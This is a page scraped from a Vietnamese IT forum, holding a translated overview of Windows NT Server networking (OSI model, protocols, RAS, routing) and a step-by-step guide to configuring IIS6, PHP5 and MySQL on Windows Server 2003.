server cung cấp cho nó cách thức tốt nhất xử lý tài nguyên trên mạng. Sử dụng kiểu partitioned data sẽ đảm bảo việc cân bằng công việc giữa các server tốt nhất.<br/><br/> 5. Quản trị hệ thống Cluster<br/><br/> Cluster hoạt động kết hợp với một trình quản trị chung và với security domain. Các khả năng này đều tồn tại trong các sản phẩm khác nhau của bộ Windows NT. Trình quản trị account và security chung được cung cấp bởi Windows NT Server Domain. Việc quản trị các phần mềm hoạt động phân tán được thực hiện qua Systems Management Server. Hệ quản trị Windows NT Cluster sẽ tập hợp các khả năng lại tạo thành bộ công cụ cho phép quan trị cluster như một hệ thống đơn lẻ. Hệ quản trị Cluster được thiết kế với giao diện đồ hoạ, quản lý tập trung tài nguyên và các dịch vụ trong hệ thống cluster.<br/><br/> 6. Mô hình truy cập dữ liệu<br/><br/> Như trên đã trình bày Windows NT Cluster đưa ra hai phương thức truy cập dữ liệu là Partitioned data và Shared data. Trong đó mô hình phân chia mọi thứ phù hợp với hệ thống xử lý đối xứng, luồng công việc được đồng bộ xử lý trên toàn hệ thống. Mô hình Partitioned data được thực hiện trên hệ thống không đối xứng, luồng công việc được chia thành các đơn vị công việc riêng rẽ được thực hiện trên các phần khác nhau.<br/> --------------------------------------------------------------------------------<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/31.html">Thảo luận mạng và thiết bị mạng</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/130.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/130/477.html#477,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><i>Tác giả: (Someone)</i><br/><br/> <b><font size='+3'>Quản trị mạng WindowsNT</font></b><br/> (Tài liệu dịch từ Windows NT Advanced Server)<br/><br/> <b>Phần I - Giới thiệu Hệ điều hành Windows NT Server. </b><br/><br/> Windows NT Advanced Server là hệ điều hành độc lập với các nền tảng phần cứng (hardware platform), có thể chạy trên các bộ vi xử lý Intel x86, DEC Alpha, PowerPC có thể chạy trên cấu hình đa vi xử lý đối xứng, cân bằng công việc của các CPUs. Windows NT là hệ điều hành 32 bits thực sự với khả năng thực hiện đa nhiệm ưu tiên (preemptive multitasking). Hệ điều hành thực hiện phân chia thời gian thực hiện tiến trình cho từng ứng dụng một cách thích hợp. Windows NT Advanced Server bao gồm các khả năng đặc trưng mạng hoàn thiện.<br/> --------------------------------------------------------------------------------<br/><br/> <b>I. Kiến trúc mạng </b><br/><br/> Tìm hiểu về mô hình tham chiếu OSI<br/> Năm 1978, Tổ Chức Chuẩn Hóa Thế Giới OSI (International Organization for Standardization) đã phát triển một mô hình cho công nghệ mạng máy tính được gọi là Mô Hình Tham Chiếu Kết Nối Các Hệ Thống Mở (Open System Interconnection Reference Model) được gọi tắt là Mô Hình Tham Chiếu OSI. Mô hình này mô tả luồng dữ liệu trong một mạng, từ các kết nối vật lý của mạng cho tới các ứng dụng dùng cho người dùng cuối.<br/> Mô Hình Tham Chiếu OSI bao gồm 7 tầng, như thể hiện trong hình dưới đây. Tầng thấp nhất, Tầng Vật Lý (Physical Layer), là nơi các bit dữ liệu được truyền tới đường dây cáp (cable) vật lý. ở trên cùng là Tầng ứng Dụng (Application Layer), là nơi các ứng dụng được thể hiện cho người dùng. Hình vẽ phía dưới.<br/> Tầng Vật Lý (Physical Layer) có trách nhiệm chuyển các bit từ một máy tính tới một tính khác, và nó quyết định việc truyền một luồng bit trên một phương tiện vật lý. Tầng này định nghĩa cách gắn cáp vào một bảng mạch điều hợp mạng (network adapter card) và kỹ thuật truyền dùng để gửi dữ liệu qua cáp đó. Nó định nghĩa việc đồng bộ và kiểm tra các bit.<br/> Tầng Liên Kết Dữ Liệu (Data Link Layer) đóng gói thô cho các bit từ tầng vật lý thành các frame (khung). Một frame là một gói tin logic, có cấu trúc trong đó có chứa dữ liệu. Tầng Liên Kết Dữ Liệu có trách nhiệm truyền các frame giữa các máy tính, mà không có lỗi. Sau khi Tầng Liên Kết Dữ Liệu gửi đi một frame, nó đợi một xác nhận (acknowledgement) từ máy tính nhận frame đó. Các frame không được xác nhận sẽ được gửi lại.<br/> Tầng Mạng (Network Layer) đánh địa chỉ các thông điệp và chuyển đổi các địa chỉ và các tên logic thành các địa chỉ vật lý. Nó cũng xác định con đường trong mạng từ máy tính nguồn tới máy tính đích, và quản lý các vấn đề giao thông, như chuyển mạch, chọn đường, và kiểm soát sự tắc nghẽn của các gói dữ liệu.<br/> Tầng Giao Vận (Transport Layer) quan tâm tới việc phát hiện lỗi và phục hồi lỗi, đảm bảo phân phát các thông điệp một các tin cậy. Nó cũng tái đóng gói các thông điệp khi cần thiết bằng cách chia các thông điệp dài thành các gói tin nhỏ để truyền đi, và ở nơi nhận nó sẽ xây dựng lại từ các gói tin nhỏ thành thông điệp ban đầu. Tầng Giao Vận cũng gửi một xác nhận về việc nhận của nó.<br/> Tầng Phiên (Session Layer) cho phép hai ứng dụng trên 2 máy tính khác nhau thiết lập, dùng, và kết thúc một phiên làm việc (session). Tầng này thiết lập sự kiểm soát hội thoại giữa hai máy tính trong một phiên làm việc, qui định phía nào sẽ truyền, khi nào và trong bao lâu.<br/> Tầng Trình Diễn (Presentation Layer) chuyển đổi dữ liệu từ Tầng ứng Dụng theo một khuôn dạng trung gian. Tầng này cũng quản lý các yêu cầu bảo mật bằng cách cung cấp các dịch vụ như mã hóa dữ liệu, và nén dữ liệu sao cho cần ít bit hơn để truyền trên mạng.<br/> Tầng ứng Dụng (Application Layer) là mức mà ở đó các ứng dụng của người dùng cuối có thể truy nhập vào các dịch vụ của mạng.<br/> Khi hai máy tính truyền thông với nhau trên một mạng, phần mềm ở mỗi tầng trên một máy tính giả sử rằng nó đang truyền thông với cùng một tầng trên máy tính kia. Ví dụ, Tầng Giao Vận của một máy tính truyền thông với Tầng Giao Vận trên máy tính kia. Tầng Giao Vận trên máy tính thứ nhất không cần để ý tới truyền thông thực sự truyền qua các tầng thấp hơn của máy tính thứ nhất, truyền qua phương tiện vật lý, và sau đó đi lên tới các tầng thấp hơn của máy tính thứ hai.<br/> Mô Hình Tham Chiếu OSI là một ý tưởng về công nghệ mạng, và một số ít hệ thống tuân thủ theo nó, nhưng mô hình này được dùng để thảo luận và so sánh các mạng với nhau.<br/> --------------------------------------------------------------------------------<br/> <b>II. Network Card Driver và Protocol làm gì? </b><br/> Một network adapter card, tức bảng mạch điều hợp mạng, (đôi khi gọi là network interface card hay vắn tắt là NIC) là một bảng mạch phần cứng được cài đặt trong máy tính của bạn để cho phép máy tính hoạt động được trên mạng. Network adapter card cung cấp một (hoặc nhiều) cổng để cho cáp mạng được nối vào về mặt vật lý, và về mặt vật lý bảng mạch đó sẽ truyền dữ liệu từ máy tính tới cáp mạng và theo chiều ngược lại.<br/> Mỗi máy tính trong mạng cần phải có một trình điều khiển (driver) cho network adapter card, đó là một chương trình phần mềm kiểm soát bảng mạch mạng. Mỗi trình điều khiển của network adapter card được cấu hình cụ thể để chạy với một kiểu bảng mạch mạng (network card) nhất định.<br/> Cùng với các bảng mạch mạng và trình điều khiển bảng mạch mạng, một máy tính mạng cũng cần phải có một trình điều khiển giao thức (protocol driver) mà đôi khi gọi là một giao thức giao vận hay chỉ vắn tắt là giao thức. Trình điều khiển giao thức thực hiện công việc giữa phần mềm mạng ở mức trên (giống như trạm làm việc và máy chủ) và network adapter card. Giao thức đóng gói dữ liệu cần gửi đi trên mạng theo cách mà máy tính ở nơi nhận có thể hiểu được.<br/> Qui trình kết hợp một trình điều khiển giao thức với network adapter card tương ứng, và thiết lập một kênh truyền thông giữa hai thứ đó gọi là kết gắn (binding).<br/> Để hai máy tính truyền thông với nhau trên một mạng, chúng phải dùng cùng một giao thức. Đôi khi một máy tính được cấu hình để dùng nhiều giao thức. Trong trường hợp này, hai máy tính chỉ cần một giao thức chung là có thể truyền thông với nhau.<br/> Trong một số mạng, mỗi trình điều khiển network adapter card và giao thức của máy tính là một phần mềm riêng. Trong một số mạng khác thì chỉ một phần mềm gọi là monolithic protocol stack thực hiện các chức năng của cả trình điều khiển network adapter card và giao thức.<br/> --------------------------------------------------------------------------------<br/><br/> <b>III. Kiến trúc mở </b><br/> Windows NT Advanced Server sử dụng hai chuẩn là NDIS (Network Driver Interface Specification) và TDI (Transport Driver Interface). NDIS là chuẩn cung cấp cho việc nói chuyện giữa card mạng (network card) và các giao thức (protocol) mạng được dùng. NDIS cho phép sử dụng nhiều giao thức mạng trên cùng một card mạng. Mặc định Windows NT Advanced Server được cung cấp sử dụng bốn giao thức đó là NetBEUI (NetBIOS Extended User Interface), TCP/IP, Microsoft NWLINK, và Data Link Control. TDI cung cấp khả năng nói chuyện giữa các giao thức mạng với các phần mềm mạng mức trên (như Server và Redirector).<br/> --------------------------------------------------------------------------------<br/> <b>IV. Ưu điểm của NDIS </b><br/> Như trên đã nói NDIS cung cấp sự liên lạc giữa các giao thức mạng với card mạng. Bất cứ trạm làm việc nào (sử dụng hệ điều hành Windows NT Workstation) đều có thể các trình điều khiển điều khiển card mạng được cung cấp nội tại trong Windows NT Advanced Server. Trong trường hợp phải sử dụng một loại card mạng khác, tức là phải cần trình điều khiển cho card mạng không có sẵn trong Windows NT, NDIS vẫn có thể sử dụng đa giao thức mạng trên card mạng này.<br/> Khi máy tính sử dụng đa giao thức mạng, các gói tin dữ liệu sẽ được chuyển đi thông qua giao thức mạng thứ nhất (giao thức này được gọi là primary protocol), nếu không được máy tính sẽ sử dụng tiếp giao thức thứ hai và cứ thế tiếp tục.<br/> Trên mỗi máy tính được cài đặt Windows NT, mỗi một giao thức mạng được đặt sử dụng trên một card mạng cần phải được đặt một giá trị gọi là LAN adapter number trên card mạng đó.<br/> --------------------------------------------------------------------------------<br/> <b>V. Tìm hiểu về TDI </b><br/> TDI là giao diện giữa tầng phiên (Session) và tầng giao vận (Transport). TDI được xây dựng với mục đích cho phép tầng giao vận có thể làm việc với các chương trình thuộc tầng trên (ví dụ như Server và Redirector) sử dụng chung một giao diện. Khi Server và Redirector tạo một lời gọi tới tầng giao vận, nó sẽ sử dụng giao diện TDI để thực hiện lời gọi này và do vậy nó không cần biết cụ thể giao thức tầng giao vận sẽ được sử dụng.<br/> Windows NT sử dụng TDI nhằm mục đích đảm bảo rằng các hệ thống sử dụng các giao thức khác nhau, thậm chí cả các Server và Redirector được viết bởi các hãng khác nhau (Third parties) có thể làm việc được với Windows NT.<br/> Sử dụng TDI đã làm cho Windows NT khắc phục nhược điểm của sản phẩm LAN manager 2.x đó là trong khi Windows NT không hạn chế số lượng các trạm làm việc nối vào Server thì LAN manager 2.x lại hạn chế ở con số 254 trạm làm việc.<br/> Có một trường hợp ngoại lệ, cho dù TDI là chuẩn giao diện giữa tầng giao vận và các tầng mức trên song riêng đối với NetBIOS các trình điều khiển và các DLLs được sử dụng để thực hiện nhiệm vụ này.<br/> --------------------------------------------------------------------------------<br/> <b>VI. Cách thức làm việc của các giao thức </b><br/> 1. NetBEUI<br/> NetBEUI lần đầu tiên được đề cập tới vào năm 1985, đây là một giao thức mạng gọn nhẹ, nhanh. Khi được bắt đầu phát triển từ năm 1985, NetBEUI cho phép phân đoạn các mạng nhóm tác nghiệp từ 20 đến 200 máy tính, cho phép kết nối giữa các segment LAN với segment LAN khác hoặc với mainframe.<br/> NetBEUI tối ưu hoá khả năng xử lý khi được sử dụng trên mạng LAN. Trên LAN, đây là giao thức mạng có cho phép lưu thông các gói tin nhanh nhất.<br/> Phiên bản NetBEUI được sử dụng cho Windows NT là NetBEUI 3.0 và có một số điểm khác với các phiên bản trước đó.<br/> Loại trừ hạn chế 254 phiên làm việc của một Server trên một card mạng.<br/> Hoàn thiện khả năng seft-tuning.<br/> Khả năng xử lý trên đường truyền tốt hơn.<br/> NetBEUI trong Windows NT là giao thức NetBIOS Frame (NBF) format. Nó sử dụng NetBIOS làm cách thức nói chuyện với các tầng mức trên.<br/> Hạn chế của NetBEUI là không có khả năng chọn đường và thực hiện kém hiệu quả trong môi trường mạng WAN. Do vậy thông thường để cài đặt mạng thường sử dụng phương pháp cài cả NetBEUI và TCP/IP để đáp ứng các chức năng thích hợp.<br/> 2. TCP/IP<br/> TCP/IP (Transmission Control Protocol/Internet Protocol) được phát triển từ cuối những năm 1970, đó là kết quả của Defense Advanced Research Projects Agency (DARPA) nghiên cứu dự kết nối giữa các mạng với nhau.<br/> Ưu điểm của giao thức TCP/IP là cung cấp khả năng kết nối giữa các mạng với hệ điều hành và phần cứng khác nhau.<br/> TCP/IP tương thích với môi trường Internet, môi trường kết nối mạng của các trường đại học, các tổ chức, chính phủ, quân đội với nhau với nhau.<br/> Với Windows NT có thể sử dụng hệ quản trị mạng SNMP để theo dõi sự hoạt động của máy tính sử dụng giao thức TCP/IP.<br/> Microsoft thực hiện giao thức TCP/IP bằng cách sử dụng STREAMS - tương thích với môi trường giao diện, Windows NT sử dụng STREAMS như là một giao diện giữa tầng TDI và tầng thấp hơn.<br/> Nhược điểm của TCP/IP là khả năng xử lý chậm hơn so với NetBEUI trong môi trường mạng LAN<br/> 3. NWLink<br/> Microsoft NWLink là chuẩn NDIS tương thích với giao thức IPX/ SPX trong môi trường mạng Novell Netware. Tương tự TCP/IP, NWLink cũng sử dụng môi trường giao diện STREAMS.<br/> NWLink cho phép một Server Windows NT có thể "nhìn thấy" một Server Netware. Song để sử dụng các tài nguyên được chia sẻ trên Server Netware này nhất thiết vẫn phải chạy chương trình Netware Client.<br/> 4. Data Link Control<br/> Data Link Control không bao giờ được đặt là primary protocol. Data Link Protocol được sử dụng nhằm các mục đích sau :<br/> Cài đặt máy tính sử dụng Windows NT cho phép truy cập đến IBM@ mainframes.<br/> Cài đặt máy in nối trực tiếp vào mạng, thay vì được nối vào cổng song song hay nối tiếp tại một print server nào đó.<br/> Data Link Control cho phép các chương trình truy cập trực tiếp tới tầng Data Link trong mô hình tham chiếu OSI.<br/> --------------------------------------------------------------------------------<br/><br/> <b>VII. Sử dụng RPC (Remote Procedure Call) </b><br/> Windows NT cung cấp khả năng sử dụng RPC để thực thi các ứng dụng phân tán. Microsoft RPC bao gồm các thư viện và các dịch vụ cho phép các ứng dụng phân tán hoạt động được trong môi trường Windows NT. Các ứng dụng phân tán chính bao gồm nhiều tiến trình thực thi với nhiệm vụ xác định nào đó. Các tiến trình này có thể chạy trên một hay nhiều máy tính.<br/> Microsoft RPC sử dụng name service provider để định vị Servers trên mạng. Microsoft RPC name service provider phải đi liền với Microsoft RPC name service interface (NIS). NIS bao bao gồm các hàm API cho phép truy cập nhiều thực thể trong cùng một name service database (name service database chứa các thực thể, nhóm các thực thể, lịch sử các thực thể trên Server).<br/> Khi cài đặt Windows NT, Microsoft Locator tự động được chọn như là name service provider. Nó là name service provider tối ưu nhất trên môi trường mạng Windows NT.<br/> --------------------------------------------------------------------------------<br/> <b>VIII. Sử dụng Remote Access Service (RAS) </b><br/> RAS cho phép remote User làm việc như là khi họ kết nối trực tiếp vào mạng. RAS là sự kết nối trong suốt với Microsoft Client và các ứng dụng trên mạng.<br/> Windows NT RAS Server phiên bản 3.5 trở lên cung cấp giao thức PPP cho phép bất cứ PPP client nào đều có thể sử dụng TCP/IP, NetBEUI, IPX truy cập. Ngoài ra Windows NT client có thể sử dụng giao thức SLIP để thực hiện Remote Access Servers. Giao thức Microsoft RAS cho phép bất cứ Microsoft RAS client nào đều có thể truy cập sử dụng Dial-in.<br/> Để truy cập vào WAN, Clients có thể sử dụng dial-in sử dụng chuẩn đường điện thoại thông qua một modem hoặc một modem pool. Nhanh nhất là sử dụng ISDN, ngoài ra có thể sử dụng X.25 hay RS-232 null modem. Microsoft RAS cho phép tối đa 256 clients dial-in.<br/> Đối với mạng LAN, giao thức IP cho phép truy cập tới mạng TCP/IP (như mạng Internet). Giao thức IPX cho phép truy cập tới các Servers Novell Netware.<br/> Windows NT Server Multi-Protocol Routing<br/> Windows NT Server, kết hợp với Windows NT Server Multi-Protocol Routing, cho phép nối giữa các mạng cục bộ, giữa mạng cục bộ với mạng diện rộng mà không cần phải có một Router riêng biệt. Windows NT Server sử dụng cả hai RIP cho IP và RIP cho IPX.<br/> Windows NT Server Multi-Protocol được cài đặt bằng cách chạy chương trình UPDATE.EXE từ đĩa hay CDROM. Chương trình này sẽ copy các tệp tin cần thiết để cài đặt.<br/> Khả năng của Windows NT Server MPR<br/> Sử dụng một RAS server để route giữa một client truy cập từ xa và một mạng LAN<br/> Dưới đây là các yêu cầu cần thiết khi sử dụng Windows NT RAS như một dial-up rouuter giữa mạng LAN và Internet hoặc với TCP/IP enterprise.<br/> 1. Windows NT computer cần một card mạng và một modem tốc độ cao.<br/> 2. Sử dụng PPP nối vào Internet hoặc mạng TCP/IP enterprise.<br/> 3. Đặt đúng địa chỉ và subnet.<br/> 4. Cài đặt đúng Registry và Default Gateway để máy tính này thực hiện đồng như là một Router và là một Client của mạng LAN.<br/> --------------------------------------------------------------------------------<br/> <b>IX. Route giữa các LANs với nhau </b><br/> Windows NT Server có thể được tăng cường bằng cách cài đặt khả năng routing giữa các mạng cục bộ với nhau và chức năng BOOTP/DHCP Relay Agent. Để cài đặt Route giữa các LANs với nhau thì Windows NT computer phải có tối thiểu 2 card mạng.<br/> --------------------------------------------------------------------------------<br/> <b>X. Route WAN </b><br/> Không thể route giữa các mạng WAN thông qua chuyển mạch gói (switched circuits) hoặc đường điện thoại (dial-up lines). Khả năng route này chỉ thực hiện được khi có WAN card (ví dụ T1 hay Frame-Relay).<br/> --------------------------------------------------------------------------------<br/> <b>XI. RIP routing cho IPX </b><br/> RIP routing cho IPX cung cấp chức năng địa chỉ hoá cho phép các gói tin được gửi đi đến một đích định trước. Phiên bản này hiện nay chưa có bất kỳ một khả năng lọc nào cho việc chuyển tiếp các gói tin, bởi vậy tất cả các thực thể trong bảng RIP và SAP chọn đường cần phải được truyền bá. Trên mạng có phạm vi rộng vấn đề giải thông cho việc chuyển tiếp các gói tin cần phải được quan tâm. Internal routing không cho phép thực hiện thông qua đường điện thoại.<br/> --------------------------------------------------------------------------------<br/> <b>XII. RIP routing cho IP </b><br/> Windows NT Server cung cấp RIP cho chức năng quản trị động bảng chọn đường giao thức IP (dynamic routing tables). Phiên bản RIP cho IP cũng không hoạt động được thông qua đường kết nối dial-up. RIP cho IP lặp lại các thông tin broadcast nên sử dụng UDP/IP thay thế cho TCP/IP.<br/> --------------------------------------------------------------------------------<br/> <b>XIII. Bảo vệ và quản trị hệ thống </b><br/> Windows NT xây dựng hệ thống bảo vệ bên trong hệ điều hành. Tự thân điều khiển truy cập cho phép người sử dụng phân quyền tới từng tệp tin riêng lẻ, tự do điều khiển trên cơ sở các chức năng cơ bản của hệ thống.<br/> Với khả năng cho phép cài đặt các domains và trust relationships, cho phép tập trung hoá việc quản trị Users và bảo vệ thông tin tại một địa điểm. Với khả năng này hệ thống mạng sẽ dễ dàng quản trị và vận hành.<br/> --------------------------------------------------------------------------------<br/><br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/23.html">Thảo luận hệ điều hành Windows</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/99.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/99/403.html#403,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Rồi Giờ Mục tiêu kế tiếp: Cấu hình IIS hỗ trợ PHP<br/><br/> Chúng ta đã cùng nhau cài cái IIS6 và sau đó là PHP5 vào Windows Server 2003<br/> Sau đó ta chạy hàm phpinfo trong file phpinfo.php thì thấy rằng báo rằng "page can not display" hay thậm chí sẽ không cho down load luôn file phpinfo.php về, vì sao IIS lại " đối xử " như thế đối với file .php khi mà rõ ràng ta đã cài đặt trình thông dịch PHP vào rồi.<br/> Để hiểu được điều này chúng ta sẽ xem wa một chút cơ chế làm việc của IIS .<br/> Khi nhận được request từ client đến 1 file nào đó (có phần mở rộng xác định, vd:.php,.asp,...) , IIS không thể tự ý xử lý một cách tùy tiện mà nó sẽ phải xem coi mình đã được chỉ đạo như thế nào.<br/> Trong trường hợp này, chúng ta hoàn toàn chưa cho IIS biết nó sẽ phải làm gì khi đụng phải "thằng" file có đuôi là<br/> .php -----&gt;"không ra lệnh thì tui ngồi chơi xơi nước cho khỏe"<br/> Để ngăn anh chàng nhân viên này trốn việc ta quy định cụ thể luôn cho hắn như sau: "Khi nhận được yêu cầu file *.php, anh bạn hãy chuyễn ngay file ấy cho đồng nghiệp là Trình thông dịch (TTD) PHP xử lý, sau khi nhận được kết quả trả về dưới dạng html thì hãy trả về cho client đả gửi request!<br/> "<br/> Và sau đây là các bước cụ thể để ra lệnh cho IIS:<br/> Các bạn chỉnh sửa các thông số như trong hình nhé:<br/> B1:Home Directory (chú ý thư mục c:\Web là thư mục gốc trên Web Server)<br/><br/> <br>
<div align="center" class="limitview"><img src='http://toantin.org/uploads/imgposts/b1.gif' border="0" /></div><br/><br/><br/> B2<img src="/hvaonline/images/smilies/575eda61e93c7ad9d05928580213fd9b.gif" border="0" alt="smilie" align="absbottom">ermission cho thư mục Web<br/> <br>
<div align="center" class="limitview"><img src='http://toantin.org/uploads/imgposts/b2.gif' border="0" /></div><br/> B3:Chọn Application Extension<br/> <br>
<div align="center" class="limitview"><img src='http://toantin.org/uploads/imgposts/b3.gif' border="0" /></div><br/><br/> B4:Web Service Extensions<br/><br/> <br>
<div align="center" class="limitview"><img src='http://toantin.org/uploads/imgposts/b4.gif' border="0" /></div><br/><br/> Okie, sau khi làm xong các bước trên các bạn hãy view lại file phpinfo.php để xem các thông tin trên Web Server.Được rồi đó...<br/> ^-^<br/> Bây giờ bạn search thử chữ mysql trên trình duyệt đang hiển thị phpinfo.php.<br/> Kết quả: không tìm thấy<br/> Okie<br/> TIếp theo chúng ta sẽ tiếp tục công việc install MySql4 lên Home Server của mình ^-&<br/><br/> CÒN TIẾP...... Cài đặt Cơ sở dữ liệu (CSDL) MySQL4 cho PHP5<br/><br/> Cụ thể trong bài này, tớ đã test với mysql-essential-4.1.11-win32.msi<br/> Các bạn Download về sau đó cài đặt bình thường.<br/> (nếu muốn cấu hình lại trong các lần chạy sau thì chạy file MySQL\bin\MySQLInstanceConfig.exe , giả sử cài cài đặt MySQL vào thư mục MySQL)<br/> Xong xuôi, bây giờ ta ung dung view lại cái trang phpinfo.php lúc trước, search thử Table của mysql trên trình duyệt đang hiển thị phpinfo.php<br/> Lạ wa', vẫn không thấy gì<br/> Điều đó chứng tỏ PHP vẫn không biết đến sự có mặt của MySQL .<br/> Đối với các phiên bản PHP trước đây (4,3,..) thì sau khi làm xong các bước trên chắn chắn sẽ search ra nguyên table của mysql.<br/> Vậy vấn đề nằm ở đâu?<br/> Thì ra, kể từ các phiên bản PHP 5 trở đi các nhà lập trình sáng tạo ra ngôn ngữ PHP đã quyết định không mặc định cho PHP xài CSDL MySQL như trước.<br/> Vậy ta phải làm sao đây?<br/> Bạn con nhớ file php.ini được tạo ra trong thư mục Windows, và php bản .zip mà tớ nói bạn tải về chứ, đã đến lúc mò đến nó<br/> Sau đây là các bước cụ thể để nói cho PHP biết :có "anh bạn" CSDL MySQL trên đời và "anh" hãy "hợp tác" với "anh ấy" để "làm ăn" ^-^ :<br/> B1: Giải nén bản PHP .zip , copy file libmySQL.dll vào thư mục WINDOWS<br/> B2:copy file php_mysql.dll vào thư mục cài đặt PHP (giả sử "D:\Program\PHP\")<br/> B3: Mở file php.ini :<br/> _sửa lại extension_dir ="D:\Program\PHP\"<br/> _Bỏ dấu ; trước dòng extension=php_mysql.dll<br/> Ok<br/> Lập lại thao tác view cái trang phpinfo.php, rồi search thử chữ mysql trên trình duyệt bạn sẽ thấy 1 table được dành riêng cho MySQL đang hiển thị<br/><br/> Đến đây mọi thao tác cài đặt và cấu hình WebServer hỗ trợ PHP đã xong.<br/> Các lần cài đặt lại (nếu có) về sau ta chỉ cần nhớ 3 bước:<br/> B1: cài đặt IIS<br/> B2: cài đặt PHP và cấu hình cho IIS nhận biết PHP<br/> B3: cài đặt MySQL và cấu hình cho PHP nhận biết MySQL<br/> enjoy !<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/23.html">Thảo luận hệ điều hành Windows</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/99.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/99/402.html#402,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><b><i>Written and tested completely by thangdiablo &nguyenthanhcong (toantin.org) ^_&</i></b><br/><br/> Hello các bạn, vừa thi học kì xong,tớ đang xả hơi vài ngày cho thư giãn , nhân lúc có thời gian cũng muốn viết 1 bài để hỗ trợ pà con nào lần đầu set up home server trên Windows Server 2003 hỗ trợ PHP và MySQL.<br/> Các bạn có thể tham khảo thêm bài viết cấu hình HomeServer bằng Dynamic DNS có rất nhiều trên Forum HVA hoặc vào www.vnnic.net.vn để tham khảo chi tiết cách làm<br/> Trở lại bài viết của chúng ta, hiện nay như các bạn đã biết thì cái IIS5 có lỗi khá nghiêm trọng (điển hình là hàng loạt Web Site và Domain bị bay trong vài tháng gần đây) cho nên Công muốn khuyên các bạn nên cài cái IIS6 (trên WinServer2003, các bạn add thêm vào từ đĩa Setup)<br/> Các phần mềm sẽ sử dụng trong bài này:<br/> php 5.0.4 các bạn tải luôn 2 bản: bản installer để cài đặt cho dễ và bản .zip để về sau ta sẽ dùng tới các file.dll trong đó www.php.net<br/> MySQL 4.1.11 win32 www.mysql.com<br/> Các bạn lên websites download về đầy đủ nguyên liệu nấu nướng chưa ạ....<br/> Nào bây giờ chúng ta bắt đầu cooking thôi ^_&:&nbsp;
</blockquote><br/><br/> Tớ giả sử rằng các bạn đã add thêm component IIS6 vào Windows Server 2003 một cách ngon lành.Và bây giờ chúng ta muốn website của ta được được viết bằng ngôn ngữ PHP và có Phpmyadmin để quản trị CSDL.<br/> Let go ---&gt;<br/> B1: cài đặt PHP<br/> chạy file php-5.0.4-íntaller.exe<br/> chú ý file php.ini được tạo ra trong thư mục Windows<br/> B2: test thử xem cái PHP này chạy không để còn tính tiếp ^_:<br/> bạn tạo file phpinfo.php với nội dung như sau:<br/><br/> QUOTE<br/> Code:<br/> &lt;? phpinfo(); ?&gt;<br/><br/><br/> Chép vào thư mục chứa Web trên máy của bạn,<br/> okie, bật trình duyệt lên wính vào:<span class="link"> http://localhost/phpinfo.php</span><br/> -----&gt; không như ý muốn rồi , có vẻ như IIS không hiểu file.php là cái giống gì<br/> Khi đó mục tiêu của chúng ta là config IIS6 để nó hiểu PHP5<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/12.html">Thảo luận thâm nhập</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/98.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/98/400.html#400,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
